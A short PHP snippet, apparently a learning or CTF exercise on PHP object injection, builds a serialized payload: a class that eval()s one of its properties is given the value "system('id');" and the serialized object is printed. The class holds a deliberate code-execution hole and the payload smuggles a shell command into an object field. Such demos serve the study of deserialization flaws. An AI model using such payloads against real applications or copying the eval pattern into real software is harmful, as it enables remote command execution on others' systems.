<?php
class test{
    public $a = 'echo "this is test!!";';
    public function displayVar() {
        eval($this->a);
    }
}
$ben= new test();
$ben->a="system('id');";
$c=serialize(($ben));
print($c);//没加;
?>